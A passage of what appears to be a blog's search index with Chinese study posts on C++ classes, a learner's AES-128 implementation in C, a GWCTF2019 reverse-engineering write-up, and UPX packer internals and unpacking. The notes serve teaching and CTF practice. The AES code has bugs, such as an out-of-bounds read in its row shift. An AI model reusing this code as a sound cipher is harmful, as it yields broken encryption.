title="构造函数"></a>构造函数</h2><p>首先他是个函数，其次他没有返回值，第三他跟当前的类名是完全一样的</p><p>他跟成员函数不同，他是在创建对象的时候使用的</p><p>作用：通过构造函数，在创建对象的同时给成员赋值</p><p><img src="/2022/03/31/C/1648776892810.png" alt="使用构造函数初始化"></p><p>注意事项：构造函数不是一定要有的，但是定义了构造函数就一定要使用，否则会报错</p><p>重载构造函数：多个构造函数，但是构造函数的参数个数不能一样</p><blockquote><p>只要函数的参数个数或者参数类型不一样，就可以存在多个同名函数，这些函数就是重载函数-成员函数</p></blockquote><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>不是必须提供的</p><p>在类中，当我们malloc时，在堆中开辟空间，但是堆中的空间使用完一般要释放，而我们无法知道什么时候才可以释放掉这个堆的空间-因为其他函数可能会继续使用。</p><p>但是，当对象不再使用的时候（对象为局部变量时），堆就可以释放掉了</p><p>析构函数-无需调用、不能重载、名字与类名相同并在其之前加个~</p><pre class="language-c" data-language="c"><code class="language-c">~Persion(){ free(arr);}</code></pre><p><img src="/2022/03/31/C/1648777636920.png"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>本质是数据的复制</p><p>当在多个结构体存在相同的成员时，我们可以将相同的成员提取出来创建一个新的结构体，在使用时只需要</p><pre class="language-c" data-language="c"><code class="language-c">struct persion{int age;int sex;}struct student:persion{int grade;int count;}struct teacher:persion{int level;int p;}teacher s；student t;</code></pre><p>上面的代码在teacher和student结构体都有四个成员，相同成员有两个</p><p><img src="/2022/03/31/C/1648778055143.png" alt="相同部分"></p><p><img src="/2022/03/31/C/1648778255917.png" alt="修改后以及Student结构体大小"></p><p>1、Persion称为父类或者基类</p><p>2、teacher、student称为子类或者派生类</p><p>3、s、t称为对象或者实例</p><p>4、可以用父类的指针指向子类的对象</p><p>示例：</p><pre class="language-none"><code class="language-none">persion*pt=&amp;t;</code></pre><p><img src="/2022/03/31/C/1648713557915.png" alt="子、父类关系"></p><p>所以我们取得子类对象地址，就可以通过其来访问父类成员，但是不能访问子类成员，因为是Persion类型的指针</p><p><img src="/2022/03/31/C/1648778654017.png" alt="通过子类访问父类"></p><p>但是不能用子类指针指向父类对象</p><p>会一直往上继承父类</p><p><img src="/2022/03/31/C/1648714159618.png" alt="多重继承"></p><p>当多重继承出现相同的名称是，需要告诉编译器是谁的a，z.x::a,z.y::a​</p><p>可以同时继承两个父类</p><h1 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h1><blockquote><p>在类中，如果我们将函数写入会让类变得十分庞大，所以可以在类中进行函数声明，然后再去类外实现，但是我们需要告诉编译器，该函数属于谁，就需要用到 void 类名::函数名(函数参数)</p></blockquote><p><img src="/2022/03/31/C/1648777822123.png" alt="函数声明"></p><h2 id="public和private"><a href="#public和private" class="headerlink" title="public和private"></a>public和private</h2><p>存储的地方没变，只是告诉编译器不能直接访问private</p><p>可以修饰函数也可以修饰变量</p><p>public是指该成员在哪里都可以使用，不用担心被修改，所以一旦发布成public成员，是不能修改名字的。而private这个成员只用于内部使用，不要在其他地方使用</p><p>一般不想被外部访问的或者以后还会修改的就发布为private</p><p>常见的类的定义应该是把变量设为private，将修改private的方法-也就是函数发布为public，并在其中加入一定的限制</p><p>使用指针可访问private成员</p><p><img src="/2022/03/31/C/1648786703451.png" alt="class"></p><h2 id="class"><a href="#class" class="headerlink" title="class"></a>class</h2><p>class和struct的不同是权限不一样，class默认为private，struct则为public，注意class的构造函数也需要声明为public</p><h3 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h3><p>如果按照struct的格式进行继承，编译器会修改成员属性为private，所以如果需要访问，需要在继承时使用:public 父类名​​，可以看到我们只能继承public类的，一旦修改为private就会报错</p><p><img src="/2022/03/31/C/1648787335642.png" alt="父类继承"></p><p>private成员只能在当前类被使用，不能被继承</p><blockquote><p>编译器会默认生成构造函数，如果存在继承关系，他会先调用父类的构造函数，因为父辈的内容也需要初始化</p></blockquote><p><img src="/2022/03/31/C/1648792481902.png" alt="子类父类构造函数执行顺序"></p><p>我们可以先得到子类的地址，然后访问，即使父类的成员是private，也会被复制过来，只是不能直接访问，下面可以看到这是3个int的大小</p><p><img src="/2022/03/31/C/1648791796705.png"></p><p>但是我们可以知道子类的地址，然后通过指针访问私有的父类</p><p><img src="/2022/03/31/C/1648792223939.png" alt="指针访问私有父类"></p><h1 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h1><p>decription</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AES-C语言实现</title>
      <link href="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://ppppz.net/2022/01/31/AES-P-Z/">https://ppppz.net/2022/01/31/AES-P-Z/</a></p><p>无论是实现还是debug的时候都离不开大佬的博客</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>实现的时候发现没学完整，导致中间实现的时候出现了问题，代码写的有点丑，我自己都看不下去了（</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;Windows.h&gt;//用于字节代换的S盒static const int S[16][16] ={0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};//用于列混合乘法的表static int colM[4][4]{2,3,1,1,1,2,3,1,1,1,2,3,3,1,1,2};//密钥扩展存储的w表int w[44]={0};int round_const[10] = {0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,0x20000000,0x40000000,0x80000000,0x1B000000,0x36000000};int CharToInt(char* key){int a[4] = { 0 };a[0] = (int) * key &lt;&lt; 24;a[1] = (int) * (key + 1) &lt;&lt; 16;a[2] = (int) * (key + 2) &lt;&lt; 8;a[3] = (int) * (key + 3);return a[0] | a[1] | a[2] | a[3];}int GetWordFromStr(char* key){int tmp=0;//因为最后返回的是一个整型，而我们传入的是四个字节，所以要先转为tmp = CharToInt(key);return tmp;}void IntToArray(int w, int* array){array[0] = (w &gt;&gt; 24)&amp;0xff;array[1] = (w &gt;&gt; 16)&amp;0xff;array[2] = (w &gt;&gt; 8) &amp; 0xff;array[3] = w &amp; 0xff;return ;}void ByteLeftMove(int* array){int tmp = array[0];for (int i = 0; i &lt; 3; ++i){array[i] = array[i + 1];}array[3] = tmp;return;}int ByteChange(int byte){int left = (byte &amp; 0xF0) &gt;&gt; 4;int right = (byte &amp; 0xF);return S[left][right];}int ArrayToInt(int* temp){int one = temp[0] &lt;&lt; 24;int two = temp[1] &lt;&lt; 16;int three = temp[2] &lt;&lt; 8;int four = temp[3];return one | two | three | four;}int T(int w, int round){int temp[4] = { 0 };IntToArray(w, temp);//先把int型的w转为数组，方便进行字循环操作ByteLeftMove(temp);//字节代换，此时需要用到S表for (int i = 0; i &lt; 4; ++i){temp[i]=ByteChange(temp[i]);}//轮常量异或，为了方便异或，先把数组转为int整型w=ArrayToInt(temp);w ^= round_const[round];return w;}void ExtendKey(char* key){//先生成一个子表，在此基础上扩展-子密钥初始化for (int i = 0; i &lt; 4; ++i){w[i] = GetWordFromStr(key + i * 4);//每四个字节生成一个w数组的元素，便于待会异或}//密钥扩展for (int i = 4,j=0; i &lt; 44; ++i){if (i % 4 == 0)//根据是否是4的整数倍，进行操作{//j表示轮数，因为最终为10轮，所以只要是4的倍数就需要+1w[i] = w[i - 4] ^ T(w[i - 1], j);j++;}elsew[i] = w[i - 4] ^ w[i - 1];}return;}void PlainToMatrix(char* Plain, int array[4][4]){//矩阵 存放和二维数组不同，这里需要注意一下int k = 0;for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){array[j][i] = Plain[k++];}}return;}void w_To_matrix(int array[4][4]){//先把每个w转为数组，然后再依次赋值给二维数组for (int i = 0; i &lt; 4; ++i){int w_temp[4];//使用临时数组存放w的值IntToArray(w[i],w_temp);for (int j = 0; j &lt; 4; ++j){array[j][i] = w_temp[j];}}return;}void Matrix_Bytechange(int array[4][4]){for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){array[i][j]=ByteChange(array[i][j]);}}return;}//行移位void RowMove(int array[4][4]){//第二行往左移动一个字符int temp = array[1][0];for (int i = 0; i &lt; 3; ++i){array[1][i] = array[1][i + 1];}array[1][3] = temp;//第三行往左移动两个字符int temp2 = array[2][0];int temp3 = array[2][1];array[2][0] = array[2][2];array[2][1] = array[2][3];array[2][2] = temp2;array[2][3] = temp3;//第四行往左移动三个字符,相当于往右移动一位int temp4 = array[3][3];for (int i = 3; i &gt;= 0; --i){array[3][i] = array[3][i - 1];}array[3][0] = temp4;return;}unsigned char XTIME(unsigned char x){return ((x &lt;&lt; 1) ^ ((x &amp; 0x80) ? 0x1b : 0x00));}//GF基于有限域上的运算int GFMul(int a, int b){unsigned char temp[8] = { a };unsigned char tempmultiply = 0x00;int i = 0;for (i = 1; i &lt; 8; i++){temp[i] = XTIME(temp[i - 1]);}tempmultiply = (b &amp; 0x01) * a;for (i = 1; i &lt;= 7; i++){tempmultiply ^= (((b &gt;&gt; i) &amp; 0x01) * temp[i]);}return tempmultiply;}//列混合void Line_Change(int array[4][4]){//这里需要用到列混合异或的表colMint temparray[4][4] = { 0 };for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){temparray[i][j] = array[i][j];}}//列混合的矩阵计算方式不同for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){array[i][j] = GFMul(colM[i][0], temparray[0][j]) ^GFMul(colM[i][1], temparray[1][j]) ^GFMul(colM[i][2], temparray[2][j]) ^GFMul(colM[i][3], temparray[3][j]);}}return;}//将矩阵的每一列转为整型int Matrix_ArraytoInt(int one, int two, int three, int four){one &lt;&lt;= 24;two &lt;&lt;= 16;three &lt;&lt;= 8;return one | two | three | four;}//将加密后的每一个整型还原到矩阵的每一列int Restore_Matrix(int temp,int num){switch(num){case 0:return temp &gt;&gt; 24;case 1:return temp &gt;&gt; 16;case 2:return temp &gt;&gt; 8;case 3:return temp;}}//轮密钥加void AddRoundKey(int array[4][4], int round){//对每一轮都要进行异或操作,为了方便异或操作，先转为整型int temp[4] = { 0 };//待会可以直接和w[round]异或，四轮for (int i = 0; i &lt; 4; ++i){IntToArray(w[round * 4 + i], temp);for (int j = 0; j &lt; 4; ++j){array[j][i] ^= temp[j];}}return;}//最终轮void FinalRound(int matrix[4][4]){Matrix_Bytechange(matrix);//行移位RowMove(matrix);//轮密钥加，注意是对应轮数的密钥AddRoundKey(matrix, 10);return;}//将矩阵还原到字符串void MatrixToPlain(char* String, int array[4][4]){int k = 0;for (int i = 0; i &lt; 4; ++i){for (int j = 0; j &lt; 4; ++j){String[k++] = array[j][i];}}//字符串以'\0'结尾String[k] = 0;}void AES_Encode(char* p, int plen, char* key){//先判断明文长度是否为16的倍数，判断密钥是否为16个字节int Text_len = strlen(p);if (strlen(p) % plen != 0){printf("长度出错，明文长度需为十六的倍数");exit(0);}//密钥长度if (strlen(key) != 16){printf("密钥长度出错，密钥长度必须为十六个字节");}//密钥扩展，通过子密钥生成ExtendKey(key);//下面进行初始变换，先把明文放入矩阵中，再与第0轮的密钥进行对应位置的逐字节异或int matrix[4][4] = { 0 };for (int k = 0; k &lt; plen; k += 16){PlainToMatrix(p+k, matrix);//明文矩阵和密钥矩阵进行轮密钥加，也就是逐字节异或AddRoundKey(matrix,0);  //问题//进行九轮相同的加密for (int i = 1; i &lt; 10; ++i){//字节代换Matrix_Bytechange(matrix);//行移位RowMove(matrix);//列混合Line_Change(matrix);//轮密钥加，注意是对应轮数的密钥AddRoundKey(matrix, i);}FinalRound(matrix);//最后还要把矩阵还原为字符串MatrixToPlain(p+k, matrix);}}int main(){char key[] = "ABCDEFGHIJKLMNOP";char PlainText[] = "ABCDEFGHIJKLMNOP";AES_Encode(PlainText, 16, key);printf("加密后的密文为:");for (int i = 0; i &lt; strlen(PlainText); ++i){printf("0x%X,",PlainText[i]&amp;0xff);}return 0;}</code></pre><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>看完AES的代码，做点AES的题巩固一下</p><h2 id="GWCTF2019-re3"><a href="#GWCTF2019-re3" class="headerlink" title="GWCTF2019-re3"></a>GWCTF2019-re3</h2><h3 id="考点-SMC、AES"><a href="#考点-SMC、AES" class="headerlink" title="考点-SMC、AES"></a>考点-SMC、AES</h3><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>这一段是SMC的解密代码，加上前面的mprotect名称，也可以大致确定，动调跑一下即可</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542144906.png" alt="SMC"></p><p>init_key函数</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542218644.png"></p><p>看到了各种table，开始不知道是什么，但是不影响，因为并没有对我们的输入进行处理，到后面可以知道这是个生成密钥的函数</p><p> <img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/IVT%7DV%7DA4I1PSHR2NX%60EP_F.png" alt="key_generate"> </p><p>刚好长度为16，对应AES的密钥长度</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542330250.png" alt="encode函数"></p><p>可以看到中间有三个函数，最后的循环对加密后的数据进行比较</p><p>而三个函数中，有两个是一样的，这是因为将我们32长度的flag分成了两段进行加密，因为这是128bits的AES加密</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542489870.png" alt="key_add"></p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542517975.png" alt="key_add"></p><p>对比AES的w表生成方式，不难看出这一段是生成w表，不过有点不同，因为我们是在矩阵中进行，并且每一次将一个w元素转为int型，倒是+0x3FFFFFFF那段不知道什么意思，网上说是无穷大的数，这里不是很影响我们的分析，就不纠结了</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542810371.png" alt="AES_Encode"></p><p>可以看出这里就是加密过程，因为先进行第0轮的轮密钥加</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542901636.png" alt="Add_Round_Key"></p><p>然后进行字节替换</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542937639.png" alt="ByteReplace"></p><p>行移位，中间有很多暂时变量，然后实现互换</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648542961376.png" alt="RowMov"></p><p>列混合</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648543006962.png" alt="MixLine"></p><p>重复进行9轮，最后进行第十轮（不包括列混合）</p><p><img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/1648543079057.png" alt="第十轮"></p><p>至此key和密文都有了，解密</p><p> <img src="/2022/03/29/AES-C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/GN37@K06OO18H7U6%5DX8W%5DYY.png"> </p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反调试大杂烩</title>
      <link href="/2022/03/27/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%A4%A7%E6%9D%82%E7%83%A9/"/>
      <url>/2022/03/27/%E5%8F%8D%E8%B0%83%E8%AF%95%E5%A4%A7%E6%9D%82%E7%83%A9/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf-wiki.org/reverse/windows/anti-debug/example/">https://ctf-wiki.org/reverse/windows/anti-debug/example/</a> </p><p><a href="https://anti-debug.checkpoint.com/techniques/assembly.html">https://anti-debug.checkpoint.com/techniques/assembly.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>压缩壳的学习</title>
      <link href="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/iBinary/p/7764483.html">https://www.cnblogs.com/iBinary/p/7764483.html</a></p><p><a href="https://bbs.pediy.com/thread-265766.htm">https://bbs.pediy.com/thread-265766.htm</a></p><p><a href="https://www.52pojie.cn/thread-727090-1-1.html">https://www.52pojie.cn/thread-727090-1-1.html</a></p><p>upx源码</p><p><a href="https://www.cnblogs.com/ichunqiu/p/7245329.html">https://www.cnblogs.com/ichunqiu/p/7245329.html</a></p><h1 id="壳的介绍"><a href="#壳的介绍" class="headerlink" title="壳的介绍"></a>壳的介绍</h1><p>壳根据不同可以分成压缩壳、加密壳、其他</p><h2 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h2><p>压缩壳，顾名思义，就是让程序变小，但是程序执行是没有问题的，主要有UPX和Aspack等</p><h2 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h2><p>加密壳就是为了保护程序而设计的，主要用于商业程序，主要有ASProtect、Armadillo、EXECryptor、Themida</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>主要是一些病毒的壳</p><h1 id="UPX压缩壳"><a href="#UPX压缩壳" class="headerlink" title="UPX压缩壳"></a>UPX压缩壳</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>压缩能让我们程序的体积变小，就类似于123456使用%x替换，672324ADB使用%C替换，这样程序代码体积就变小了</p><p>压缩壳的工作原理首先在程序开头或者其他合适的地方插入一段代码（包括解压缩的代码），然后再将程序的其他地方进行压缩</p><p>压缩的数据主要是PE文件的节的数据</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/vv0bcog94g.png" alt="压缩"></p><p>当程序执行时，实现对程序的解压缩，所以不会影响程序的执行</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648344699085.png" alt="正常程序"></p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648344795798.png" alt="加壳后的程序"></p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648344833463.png" alt="程序解压缩"></p><h2 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h2><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/v3o2hqc77w.png"></p><p>因为程序需要解压缩，但是原来的节的位置已经被占据，那么壳是怎么恢复数据的呢</p><p>首先我们知道原PE的节的个数以及大小，那么此时我们生成的新的带壳PE，则会获得大小。然后在其带壳PE的下面申请怎么大小的节用来占位置即可，也就是说运行时，shell会进行偏移，不会占用解压缩的节的位置</p><p>那么此时我们解压的数据，则会写到我们占位置的地方。</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/wbx7n8dg8k.png"></p><h1 id="壳的加载过程"><a href="#壳的加载过程" class="headerlink" title="壳的加载过程"></a>壳的加载过程</h1><h2 id="1、保存入口参数"><a href="#1、保存入口参数" class="headerlink" title="1、保存入口参数"></a>1、保存入口参数</h2><p>加壳程序在初始化时会保存各寄存器的值，等到外壳执行完毕，再恢复各个寄存器的值，最后跳转到原程序执行。通常使用Push ad/pop ad、pushfd/popfd指令来保存和恢复现场</p><h2 id="2、获取壳本身需要使用的API地址"><a href="#2、获取壳本身需要使用的API地址" class="headerlink" title="2、获取壳本身需要使用的API地址"></a>2、获取壳本身需要使用的API地址</h2><p>在一般情况下，外壳的输入表只有GetProcAddress、GetModuleHandle和LoadLibary这三个API函数，甚至只有Kernel32.dll及GetProcAddress。如果需要使用其他API函数，可以通过LoadLibaryA或者LoadLibaryExA将DLL文件映像映射到调用进程的地址空间中，函数返回的HINSTANCE值用于标识文件映像所映射的虚拟内存地址。也就相当于DLL的基址</p><h3 id="LoadLibrary函数"><a href="#LoadLibrary函数" class="headerlink" title="LoadLibrary函数"></a>LoadLibrary函数</h3><p>原型如下</p><pre class="language-c" data-language="c"><code class="language-c">HINSTANCE LoadLibary{LPCTSTR lpLibFIlenam;//DLL文件名地址}</code></pre><p>返回值：成功则返回模块的句柄，失败则返回”NULL”。</p><h2 id="GetModuleHandle函数"><a href="#GetModuleHandle函数" class="headerlink" title="GetModuleHandle函数"></a>GetModuleHandle函数</h2><p>如果DLL文件已被映射到调用进程的地址空间中，可以调用GetModuleHandleA函数获取DLL模块的句柄，函数原型如下</p><pre class="language-c" data-language="c"><code class="language-c">HMODULE GetModuleHandle{LPCTSTR lpModuleName//DLL文件名地址}</code></pre><h2 id="GetProcAddress函数"><a href="#GetProcAddress函数" class="headerlink" title="GetProcAddress函数"></a>GetProcAddress函数</h2><p>一旦DLL模块被加载，线程就可以调用GetProcAddress函数来获取输入函数的地址了，该函数原型如下</p><pre class="language-c" data-language="c"><code class="language-c">FARPROC GetProcAddress{HMODULE hModule,//DLL模块句柄LPCSTR lpProName //函数名}</code></pre><p>但是有些壳为了提高强度，不使用系统提供的GetProcAddress函数，而是自己编写函数来替代这个API函数，以提高函数调用的隐蔽性</p><h2 id="3、解密原程序的各个区块的数据"><a href="#3、解密原程序的各个区块的数据" class="headerlink" title="3、解密原程序的各个区块的数据"></a>3、解密原程序的各个区块的数据</h2><p>为了保护原程序代码和数据，壳一般会加密原程序文件的各个区块。在执行时进行解密，因为壳一般是按区块进行加密的，所以在解密的时候也是按照区块解密的，并且将解密的区块数据按照区块的定义放入内存中合适的位置</p><h2 id="4、IAT的初始化"><a href="#4、IAT的初始化" class="headerlink" title="4、IAT的初始化"></a>4、IAT的初始化</h2><p>IAT的填写本来是由 PE装载器实现，但是由于在加壳时构造了一个自建输入表，并且让PE文件头数据目录表的输入表指针指向新建的输入表，PE装载器就会对自建输入表进行填写。而程序的原始输入表被被外壳变形后储存，所以IAT表的填写需要外壳程序来实现。外壳需要做的就是将这个变形输入表从头到尾扫描一遍，重新获取每一个DLL引入的所有函数的地址，并将其填写在IAT表中</p><h2 id="5、重定位项的处理"><a href="#5、重定位项的处理" class="headerlink" title="5、重定位项的处理"></a>5、重定位项的处理</h2><p>对于EXE文件，Windows会尽量满足其需求。比如EXE文件的基址一般是4000000h，那么加载到内存中就是4000000，这种情况下就不需要进行重定位。</p><p>但是对DLL就不一样了，因为Windows系统没办法保证每次运行时都提供相同的基地址，所以需要重定位，所以加壳的DLL一般会多一个重定位表</p><h2 id="6、Hook-API"><a href="#6、Hook-API" class="headerlink" title="6、Hook API"></a>6、Hook API</h2><p>在程序文件中，输入表的作用是让windows操作系统在程序运行时将API的实际地址提供给程序使用。在程序第一行代码被执行前，Windows操作系统就完成了这个操作。</p><p>而壳大多在修改原程序文件的输入表之后自己模仿Windows操作系统的工作流程，向输入表填充相关数据，在填充过程中，外壳可以Hook API代码的地址，从而间接获得程序的控制权</p><h2 id="7、跳转到原程序入口-OEP"><a href="#7、跳转到原程序入口-OEP" class="headerlink" title="7、跳转到原程序入口-OEP"></a>7、跳转到原程序入口-OEP</h2><p>从这个时候开始，壳将控制权还给原程序</p><h1 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h1><p>引用了别人的图，看起来比较清晰，不过这个是x64下的</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/842206_VKJXADJYNEQVSUQ.jpg"></p><p>可以发现在磁盘文件中，upx0是不存在的，使用工具也可以看到</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648358178362.png"></p><p>但是看UPX1的VirtualAddress可以知道这两个节中间有很大的空余区域，这些区域是存放解压缩后的原程序数据的</p><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><p>这里以UPX壳为例</p><p>首先我们知道压缩壳会修改程序入口，拖进OD发现断在了push ad</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648345714976.png"></p><h2 id="寻找OEP"><a href="#寻找OEP" class="headerlink" title="寻找OEP"></a>寻找OEP</h2><h3 id="根据跨段指令寻找OEP"><a href="#根据跨段指令寻找OEP" class="headerlink" title="根据跨段指令寻找OEP"></a>根据跨段指令寻找OEP</h3><p><a href="https://www.cnblogs.com/dilex/p/5547241.html">https://www.cnblogs.com/dilex/p/5547241.html</a></p><p><a href="https://www.52pojie.cn/thread-294773-1-1.html">https://www.52pojie.cn/thread-294773-1-1.html</a></p><h3 id="用内存访问断点寻找OEP"><a href="#用内存访问断点寻找OEP" class="headerlink" title="用内存访问断点寻找OEP"></a>用内存访问断点寻找OEP</h3><p>先码着</p><p><a href="https://blog.csdn.net/jyk764717697/article/details/7306621?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&amp;utm_relevant_index=1">https://blog.csdn.net/jyk764717697/article/details/7306621?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.pc_relevant_default&amp;utm_relevant_index=1</a></p><h3 id="根据栈平衡寻找OEP-ESP定律"><a href="#根据栈平衡寻找OEP-ESP定律" class="headerlink" title="根据栈平衡寻找OEP-ESP定律"></a>根据栈平衡寻找OEP-ESP定律</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" 